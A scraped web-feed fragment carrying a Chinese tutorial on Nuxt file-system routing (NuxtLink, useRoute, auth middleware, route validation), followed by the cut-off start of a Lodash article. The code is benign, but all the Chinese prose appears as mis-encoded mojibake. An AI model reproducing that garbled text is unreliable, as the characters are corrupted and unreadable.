            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3044986347066480/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ±Ÿæ¹–æ–‡äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:31:09.000Z" title="Tue Jan 13 2026 01:31:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p><code>Nuxt</code>çš„æ–‡ä»¶ç³»ç»Ÿè·¯ç”±ä¼šä¸º<code>pages/</code>ç›®å½•ä¸­çš„æ¯ä¸ªæ–‡ä»¶åˆ›å»ºä¸€ä¸ªè·¯ç”±ã€‚</p>
<p><code>Nuxt</code>çš„æ ¸å¿ƒåŠŸèƒ½ä¹‹ä¸€æ˜¯æ–‡ä»¶ç³»ç»Ÿè·¯ç”±å™¨ã€‚<code>pages/</code>ç›®å½•ä¸­çš„æ¯ä¸ª<code>Vue</code>æ–‡ä»¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”çš„<code>URL</code>ï¼ˆæˆ–è·¯ç”±ï¼‰ï¼Œç”¨äºå±•ç¤ºè¯¥æ–‡ä»¶çš„å†…å®¹ã€‚é€šè¿‡ä¸ºæ¯ä¸ªé¡µé¢ä½¿ç”¨åŠ¨æ€å¯¼å…¥ï¼Œ<code>Nuxt</code>åˆ©ç”¨ä»£ç åˆ†å‰²æŠ€æœ¯ï¼Œåªä¸ºè¯·æ±‚çš„è·¯ç”±åŠ è½½æœ€å°‘çš„<code>JavaScript</code>ã€‚</p>
<h2 data-id="heading-0">é¡µé¢</h2>
<p><code>Nuxt</code>è·¯ç”±åŸºäº<code>vue-router</code>æ„å»ºï¼Œä¼šæ ¹æ®<code>pages/</code>ç›®å½•ä¸­åˆ›å»ºçš„æ¯ä¸ªç»„ä»¶çš„æ–‡ä»¶åç”Ÿæˆè·¯ç”±ã€‚</p>
<p>è¿™ç§æ–‡ä»¶ç³»ç»Ÿè·¯ç”±é‡‡ç”¨å‘½åçº¦å®šæ¥åˆ›å»ºåŠ¨æ€è·¯ç”±å’ŒåµŒå¥—è·¯ç”±ï¼š</p>
<pre><code class="hljs language-md" lang="md">ç›®å½•ç»“æ„

<span class="hljs-bullet">-</span> pages/
-- about.vue
-- index.vue
-- posts/
--- [id].vue
</code></pre>
<pre><code class="hljs language-md" lang="md">ç”Ÿæˆçš„è·¯ç”±æ–‡ä»¶

{
  "routes": [
<span class="hljs-code">      {
          "path": "/about",
          "component": "pages/about.vue"
      },
      {
          "path": "/",
          "component": "pages/index.vue"
      },
      {
          "path": "/posts/:id",
          "component": "pages/posts/[id].vue"
      }
  ]
}
</span></code></pre>
<h2 data-id="heading-1">å¯¼èˆª</h2>
<p><code>&lt;NuxtLink&gt;</code>ç»„ä»¶ç”¨äºåœ¨é¡µé¢ä¹‹é—´è¿›è¡Œé“¾æ¥ã€‚å®ƒä¼šæ¸²æŸ“ä¸€ä¸ª<code>&lt;a&gt;</code>æ ‡ç­¾ï¼Œå…¶<code>href</code>å±æ€§è®¾ç½®ä¸ºç›®æ ‡é¡µé¢çš„è·¯ç”±ã€‚åº”ç”¨ç¨‹åºæ¿€æ´»åï¼Œé¡µé¢åˆ‡æ¢é€šè¿‡<code>JavaScript</code>å®Œæˆï¼ŒåŒæ—¶æ›´æ–°æµè§ˆå™¨çš„<code>URL</code>ã€‚è¿™é¿å…äº†æ•´é¡µåˆ·æ–°ï¼Œå¹¶æ”¯æŒåŠ¨ç”»è¿‡æ»¤æ•ˆæœã€‚</p>
<p>å½“<code>&lt;NuxtLink&gt;</code>è¿›å…¥å®¢æˆ·ç«¯çš„è§†å£æ—¶ï¼Œ<code>Nuxt</code>ä¼šè‡ªåŠ¨é¢„åŠ è½½é“¾æ¥é¡µé¢çš„ç»„ä»¶å’Œæœ‰æ•ˆè½½è·ï¼ˆç”Ÿæˆçš„é¡µé¢ï¼‰ï¼Œä»è€Œå®ç°æ›´å¿«çš„å¯¼èˆªã€‚</p>
<pre><code class="hljs language-html" lang="html">// pages/app.vue

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">NuxtLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/about"</span>&gt;</span>å…³äº<span class="hljs-tag">&lt;/<span class="hljs-name">NuxtLink</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">NuxtLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/posts/1"</span>&gt;</span>æ–‡ç«  1<span class="hljs-tag">&lt;/<span class="hljs-name">NuxtLink</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">NuxtLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/posts/2"</span>&gt;</span>æ–‡ç«  2<span class="hljs-tag">&lt;/<span class="hljs-name">NuxtLink</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<blockquote>
<p>Docs - API - Components - Nuxt Link.</p>
</blockquote>
<h2 data-id="heading-2">è·¯ç”±å‚æ•°</h2>
<p>åœ¨<code>Vue</code>ç»„ä»¶çš„<code>&lt;script setup&gt;</code>å—æˆ–<code>setup()</code>æ–¹æ³•ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>useRoute()</code>ç»„åˆå¼<code>API</code>æ¥è®¿é—®å½“å‰è·¯ç”±çš„è¯¦ç»†ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-html" lang="html">// pages/posts/[id].vue

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()

<span class="hljs-comment">// è®¿é—® /posts/1 æ—¶ï¼Œroute.params.id çš„å€¼ä¸º 1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-3">è·¯ç”±ä¸­é—´ä»¶</h2>
<p><code>Nuxt</code>æä¾›äº†ä¸€ä¸ªå¯è‡ªå®šä¹‰çš„è·¯ç”±ä¸­é—´ä»¶æ¡†æ¶ï¼Œä½ å¯ä»¥åœ¨æ•´ä¸ªåº”ç”¨ä¸­ä½¿ç”¨å®ƒï¼Œé€‚åˆæå–é‚£äº›éœ€è¦åœ¨å¯¼èˆªåˆ°ç‰¹å®šè·¯ç”±ä¹‹å‰è¿è¡Œçš„ä»£ç ã€‚</p>
<blockquote>
<p>è·¯ç”±ä¸­é—´ä»¶åœ¨<code>Nuxt</code>åº”ç”¨çš„<code>Vue</code>éƒ¨åˆ†è¿è¡Œã€‚å°½ç®¡åç§°ç›¸ä¼¼ï¼Œä½†å®ƒä»¬ä¸æœåŠ¡å™¨ä¸­é—´ä»¶å®Œå…¨ä¸åŒï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶åœ¨åº”ç”¨çš„<code>Nitro</code>æœåŠ¡å™¨éƒ¨åˆ†è¿è¡Œã€‚</p>
</blockquote>
<p>è·¯ç”±ä¸­é—´ä»¶æœ‰ä¸‰ç§ç±»å‹ï¼š</p>
<p>1ã€åŒ¿åï¼ˆæˆ–å†…è”ï¼‰è·¯ç”±ä¸­é—´ä»¶ï¼Œç›´æ¥å®šä¹‰åœ¨ä½¿ç”¨å®ƒä»¬çš„é¡µé¢ä¸­ã€‚</p>
<p>2ã€å‘½åè·¯ç”±ä¸­é—´ä»¶ï¼Œæ”¾ç½®åœ¨<code>middleware/</code>ç›®å½•ä¸­ï¼Œå½“åœ¨é¡µé¢ä¸Šä½¿ç”¨æ—¶ï¼Œä¼šé€šè¿‡å¼‚æ­¥å¯¼å…¥è‡ªåŠ¨åŠ è½½ã€‚ï¼ˆæ³¨æ„ï¼šè·¯ç”±ä¸­é—´ä»¶çš„åç§°è§„èŒƒåŒ–ä¸ºçŸ­æ¨ªçº¿å‘½åæ³•ï¼Œå› æ­¤<code>someMiddleware</code>ä¼šå˜ä¸º<code>some-middleware</code>ï¼‰ã€‚</p>
<p>3ã€å…¨å±€è·¯ç”±ä¸­é—´ä»¶ï¼Œæ”¾ç½®åœ¨<code>middleware/</code>ç›®å½•ä¸­ï¼ˆå¸¦æœ‰<code>.global</code>åç¼€ï¼‰ï¼Œä¼šåœ¨æ¯æ¬¡è·¯ç”±å˜åŒ–æ—¶è‡ªåŠ¨è¿è¡Œã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¿æŠ¤<code>/dashboard</code>é¡µé¢çš„<code>auth</code>ä¸­é—´ä»¶ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// middleware/auth.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineNuxtRouteMiddleware</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
   <span class="hljs-comment">// isAuthenticated() æ˜¯ä¸€ä¸ªç¤ºä¾‹æ–¹æ³•ï¼Œç”¨äºéªŒè¯ç”¨æˆ·æ˜¯å¦å·²è®¤è¯</span>
   <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isAuthenticated</span>() === <span class="hljs-literal">false</span>) {
       <span class="hljs-keyword">return</span> <span class="hljs-title function_">navigateTo</span>(<span class="hljs-string">'/login'</span>)
   }
})
</code></pre>
<h2 data-id="heading-4">è·¯ç”±éªŒè¯</h2>
<p><code>Nuxt</code>é€šè¿‡æ¯ä¸ªéœ€è¦éªŒè¯çš„é¡µé¢ä¸­<code>definePageMeta()</code>é‡Œçš„<code>validate</code>å±æ€§æä¾›è·¯ç”±éªŒè¯åŠŸèƒ½ã€‚</p>
<p><code>validate</code>å±æ€§æ¥æ”¶<code>route</code>ä½œä¸ºå‚æ•°ã€‚ä½ å¯ä»¥è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼æ¥ç¡®å®šè¿™æ˜¯å¦æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨å½“å‰é¡µé¢æ¸²æŸ“çš„æœ‰æ•ˆè·¯ç”±ã€‚å¦‚æœè¿”å›<code>false</code>ï¼Œå°†å¯¼è‡´<code>404</code>é”™è¯¯ã€‚ä¹Ÿå¯ä»¥ç›´æ¥è¿”å›ä¸€ä¸ªåŒ…å«<code>statusCode/statusMessage</code>çš„å¯¹è±¡æ¥è‡ªå®šä¹‰è¿”å›çš„é”™è¯¯ã€‚</p>
<p>å¦‚æœæœ‰æ›´å¤æ‚çš„ä½¿ç”¨åœºæ™¯ï¼Œå¯ä»¥æ”¹ç”¨åŒ¿åè·¯ç”±ä¸­é—´ä»¶ã€‚</p>
<pre><code class="hljs language-html" lang="html">// pages/posts/[id].vue
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-title function_">definePageMeta</span>({
    <span class="hljs-attr">validate</span>: <span class="hljs-title function_">async</span>(route) =&gt; {
      <span class="hljs-comment">// æ£€æŸ¥ id æ˜¯å¦ç”±æ•°å­—ç»„æˆ</span>
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span> === <span class="hljs-string">'string'</span> &amp;&amp; <span class="hljs-regexp">/^\d+$/</span>.<span class="hljs-title function_">test</span>(route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)
    }
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-5">æ ¸å¿ƒ</h2>
<p><strong>çº¦å®šé«˜äºé…ç½®</strong>ï¼šé€šè¿‡åœ¨<code>pages/</code>ç›®å½•ä¸­åˆ›å»º<code>.vue</code>æ–‡ä»¶ï¼Œè‡ªåŠ¨ç”Ÿæˆå¯¹åº”çš„è·¯ç”±ã€‚</p>
<p><strong>ä»£ç åˆ†å‰²</strong>ï¼šæ¯ä¸ªé¡µé¢ç»„ä»¶éƒ½ç”¨åŠ¨æ€å¯¼å…¥ï¼Œä¼˜åŒ–é¦–å±åŠ è½½æ€§èƒ½ã€‚</p>
<p><strong>è·¯å¾„æ˜ å°„</strong>ï¼šæ–‡ä»¶è·¯å¾„ç›´æ¥æ˜ å°„ä¸º<code>URL</code>è·¯å¾„ã€‚</p>
<h2 data-id="heading-6">ç¤ºä¾‹</h2>
<pre><code class="hljs language-md" lang="md">pages/
â”œâ”€â”€ index.vue          â†’ /
â”œâ”€â”€ about.vue          â†’ /about
â”œâ”€â”€ posts/
â”‚   â”œâ”€â”€ index.vue     â†’ /posts
â”‚   â””â”€â”€ [id].vue      â†’ /posts/:id (åŠ¨æ€è·¯ç”±)
â””â”€â”€ user/
<span class="hljs-code">    â””â”€â”€ [id]/
        â””â”€â”€ profile.vue â†’ /user/:id/profile (åµŒå¥—è·¯ç”±)
</span></code></pre>
<h2 data-id="heading-7">API</h2>
<p><code>&lt;NuxtLink&gt;</code>ï¼šæ™ºèƒ½å¯¼èˆªç»„ä»¶ï¼Œæ”¯æŒé¢„åŠ è½½å’Œå®¢æˆ·ç«¯å¹³ç¼“è¿‡æ¸¡ã€‚</p>
<p><code>useRoute()</code>ï¼šè·å–å½“å‰è·¯ç”±ä¿¡æ¯ï¼ˆå‚æ•°ã€æŸ¥è¯¢ç­‰ï¼‰</p>
<p><code>definePageMeta()</code>ï¼šå®šä¹‰é¡µé¢å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬éªŒè¯è§„åˆ™ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Lodash æºç è§£è¯»ä¸åŸç†åˆ†æ - Lodash å‰ä¸–ä»Šç”Ÿï¼šè®¾è®¡åŸåˆ™ä¸æ¼”è¿›è„‰ç»œ]]></title>    <link>https://juejin.cn/post/7594398051721019430</link>    <guid>https://juejin.cn/post/7594398051721019430</guid>    <pubDate>2026-01-13T01:40:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594398051721019430" data-draft-id="7592552501578809370" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Lodash æºç è§£è¯»ä¸åŸç†åˆ†æ - Lodash å‰ä¸–ä»Šç”Ÿï¼šè®¾è®¡åŸåˆ™ä¸æ¼”è¿›è„‰ç»œ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-13T01:40:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Anita_Sun"/> <meta itemprop="url" content="https://juejin.cn/user/1811635884786839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Lodash æºç è§£è¯»ä¸åŸç†åˆ†æ - Lodash å‰ä¸–ä»Šç”Ÿï¼šè®¾è®¡åŸåˆ™ä¸æ¼”è¿›è„‰ç»œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1811635884786839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Anita_Sun
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:40:32.000Z" title="Tue Jan 13 2026 01:40:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body 